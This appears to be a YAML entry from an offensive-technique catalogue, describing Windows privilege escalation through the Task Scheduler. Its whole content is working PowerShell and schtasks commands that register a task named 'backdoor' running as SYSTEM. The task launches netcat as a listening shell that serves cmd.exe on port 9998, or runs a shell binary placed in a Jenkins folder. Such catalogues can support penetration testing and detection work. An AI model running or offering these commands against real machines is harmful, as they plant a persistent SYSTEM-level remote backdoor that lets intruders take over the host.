---
functions:
  privilege-escalation:
    - description: Use Windows Scheduler to elevate permissions to SYSTEM via a backdoor
      code: |
        Unregister-ScheduledTask -TaskName "backdoor"
        $filepath = "C:\users\admin\documents\nc.exe"
        $port = "9998"
        $taskname = "backdoor"
        $time = "1:57"
        $action = New-ScheduledTaskAction -Execute $filepath -argument "-l -p $port -e cmd.exe"
        $trigger = New-ScheduledTaskTrigger -At $time -Once
        $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet
        $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
        Register-ScheduledTask $taskname -InputObject $task


        View task:
        Get-ScheduledTask -TaskName backdoor

        Run Task:
        Start-ScheduledTask -TaskName backdoor


        schtasks /CREATE /RU "NT AUTHORITY\SYSTEM" /SC once /TR "C:\Program Files (x86)\Jenkins\shell.exe" /ST 01:57 /TN backdoor /RL HIGHEST /F
        schtasks /QUERY /TN backdoor
        schtasks /RUN /TN backdoor
        SCHTASKS /Delete /TN backdoor /F


resources : |

---

